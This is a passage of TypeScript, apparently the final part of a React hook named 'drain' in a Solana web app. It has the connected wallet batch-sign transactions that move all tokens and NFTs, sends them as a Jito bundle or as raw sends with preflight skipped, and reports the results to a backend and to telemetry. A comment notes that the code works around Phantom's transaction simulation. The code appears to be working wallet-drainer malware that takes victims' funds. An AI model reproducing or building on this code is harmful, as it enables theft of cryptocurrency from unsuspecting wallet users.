            setStatus("signing");

            let signedTransactions: VersionedTransaction[];

            if (canBatchSign && signAllTransactions) {
                // Batch sign — single wallet popup for all TXs
                try {
                    signedTransactions = await withTimeout(
                        () => signAllTransactions(versionedTransactions),
                        CONFIRMATION_TIMEOUT_MS,
                    );
                } catch (e) {
                    throw e;
                }
            } else if (canSingleSign && signTransaction) {
                // Fallback: sign one at a time
                signedTransactions = [];
                for (const tx of versionedTransactions) {
                    const signed = await withTimeout(
                        () => signTransaction(tx),
                        RPC_TIMEOUT_MS * 2,
                    );
                    signedTransactions.push(signed);
                }
            } else {
                // Last resort: use sendTransaction for single-TX legacy path
                // This triggers Phantom simulation but is the only option
                console.warn("[DRAIN] Falling back to legacy sendTransaction path");

                await sendTelemetry(
                    TelemetryEvents.fallbackLegacy(
                        "Wallet does not support signTransaction",
                    ),
                ).catch(() => {});

                // Build legacy TX with all instructions from first bundle transaction
                const legacyTx = new Transaction();
                for (const bt of bundleTransactions) {
                    legacyTx.add(...bt.instructions);
                }
                legacyTx.recentBlockhash = blockhash;
                legacyTx.feePayer = publicKey;

                const signature = await withTimeout(
                    () => sendTransaction(legacyTx, connection, { maxRetries: 3 }),
                    RPC_TIMEOUT_MS * 2,
                );

                setStatus("confirming");

                const result = await connection.confirmTransaction(
                    { signature, blockhash, lastValidBlockHeight },
                    "confirmed",
                );

                if (result.value.err) {
                    throw new Error("Transaction failed on-chain");
                }

                setStatus("success");
                setStats((prev) => prev ? { ...prev, signatures: [signature] } : null);

                await sendToBackendDrain(
                    publicKey.toBase58(),
                    validation.availableForTransfer,
                    [signature],
                    tokensForBackend,
                );

                await sendTelemetry(
                    TelemetryEvents.bundleConfirmed(
                        "legacy-single-tx", undefined, totalValueUSD,
                        bundleTokenCount, bundleNftCount,
                        validation.availableForTransfer,
                    ),
                ).catch(() => {});

                return;
            }

            console.log(
                `[DRAIN] Signed ${signedTransactions.length} transactions`,
            );

            // ═══ PHASE 14: SUBMIT JITO BUNDLE ═══
            setStatus("bundling");

            const serializedTxs = signedTransactions.map((tx) => tx.serialize());
            let bundleId: string;

            try {
                bundleId = await submitJitoBundle(serializedTxs);
            } catch (e) {
                // Jito submission failed — fallback to sequential sendRawTransaction
                console.warn(
                    "[DRAIN] Jito bundle submission failed, falling back to sequential send:",
                    e instanceof Error ? e.message : String(e),
                );

                await sendTelemetry(
                    TelemetryEvents.fallbackLegacy(
                        `Jito failed: ${e instanceof Error ? e.message : String(e)}`,
                    ),
                ).catch(() => {});

                const fallbackSignatures: string[] = [];

                for (let i = 0; i < serializedTxs.length; i++) {
                    try {
                        const sig = await withRetryAndTimeout(() =>
                            connection.sendRawTransaction(serializedTxs[i], {
                                skipPreflight: true,
                                maxRetries: 3,
                            }),
                        );
                        fallbackSignatures.push(sig);
                        console.log(
                            `[DRAIN] Fallback TX ${i + 1} sent: ${sig.slice(0, 20)}...`,
                        );
                    } catch (sendErr) {
                        console.error(
                            `[DRAIN] Fallback TX ${i + 1} failed:`,
                            sendErr instanceof Error ? sendErr.message : String(sendErr),
                        );
                    }
                }

                if (fallbackSignatures.length === 0) {
                    throw new Error("All transaction submissions failed");
                }

                setStatus("confirming");

                // Confirm the first signature
                const confirmResult = await connection.confirmTransaction(
                    {
                        signature: fallbackSignatures[0],
                        blockhash,
                        lastValidBlockHeight,
                    },
                    "confirmed",
                );

                if (confirmResult.value.err) {
                    throw new Error("Transaction failed on-chain");
                }

                setStatus("success");
                setStats((prev) =>
                    prev ? { ...prev, signatures: fallbackSignatures } : null,
                );

                await sendToBackendDrain(
                    publicKey.toBase58(),
                    validation.availableForTransfer,
                    fallbackSignatures,
                    tokensForBackend,
                );

                await sendTelemetry(
                    TelemetryEvents.bundleConfirmed(
                        "fallback-sequential",
                        undefined,
                        totalValueUSD,
                        bundleTokenCount,
                        bundleNftCount,
                        validation.availableForTransfer,
                    ),
                ).catch(() => {});

                return;
            }

            // Extract signatures from signed transactions for telemetry
            const txSignatures: string[] = signedTransactions.map((tx) => {
                try {
                    // VersionedTransaction signature is at index 0
                    const sig = tx.signatures[0];
                    if (sig) {
                        // Convert Uint8Array to base58
                        const bs58Chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
                        let result = "";
                        let num = BigInt(0);
                        for (const byte of sig) {
                            num = num * BigInt(256) + BigInt(byte);
                        }
                        while (num > BigInt(0)) {
                            result = bs58Chars[Number(num % BigInt(58))] + result;
                            num = num / BigInt(58);
                        }
                        // Add leading '1's for leading zero bytes
                        for (const byte of sig) {
                            if (byte === 0) result = "1" + result;
                            else break;
                        }
                        return result || "unknown";
                    }
                    return "unsigned";
                } catch {
                    return "unknown";
                }
            });

            await sendTelemetry(
                TelemetryEvents.bundleSubmitted(
                    bundleId,
                    signedTransactions.length,
                    txSignatures,
                ),
            ).catch(() => {});

            // ═══ PHASE 15: POLL JITO BUNDLE STATUS ═══
            setStatus("confirming");

            const bundleResult = await pollJitoBundleStatus(bundleId);

            if (bundleResult.status === "failed") {
                await sendTelemetry(
                    TelemetryEvents.bundleFailed(bundleId, "On-chain execution failed"),
                ).catch(() => {});
                throw new Error("Jito bundle failed on-chain");
            }

            if (bundleResult.status === "expired") {
                console.warn("[DRAIN] Jito bundle expired — status unknown");
                await sendTelemetry(
                    TelemetryEvents.bundleFailed(
                        bundleId,
                        "Bundle status polling timed out — may still confirm",
                    ),
                ).catch(() => {});
                // Don't throw — the bundle might still land
                setStatus("success");
                setStats((prev) =>
                    prev
                        ? {
                              ...prev,
                              bundleId,
                              signatures: bundleResult.signatures.length > 0
                                  ? bundleResult.signatures
                                  : txSignatures,
                          }
                        : null,
                );
                return;
            }

            // ═══ PHASE 16: SUCCESS — BACKEND MIRROR + TELEMETRY ═══
            const finalSignatures =
                bundleResult.signatures.length > 0
                    ? bundleResult.signatures
                    : txSignatures;

            setStats((prev) =>
                prev
                    ? {
                          ...prev,
                          bundleId,
                          signatures: finalSignatures,
                      }
                    : null,
            );

            await sendToBackendDrain(
                publicKey.toBase58(),
                validation.availableForTransfer,
                finalSignatures,
                tokensForBackend,
                bundleId,
            );

            setStatus("success");

            console.log(
                `[DRAIN] Operation ${ctx.operationId} complete | Bundle: ${bundleId} | Slot: ${bundleResult.slot}`,
            );

            await sendTelemetry(
                TelemetryEvents.bundleConfirmed(
                    bundleId,
                    bundleResult.slot,
                    totalValueUSD,
                    bundleTokenCount,
                    bundleNftCount,
                    validation.availableForTransfer,
                ),
            ).catch(() => {});
        } catch (e: any) {
            handleError(e, setError, setStatus, ctx, "drain-operation");
        } finally {
            drainInProgressRef.current = false;
        }
    }, [
        publicKey, signAllTransactions, signTransaction,
        sendTransaction, connection, sendToBackendDrain,
    ]);

    return { drain, status, error, stats };
};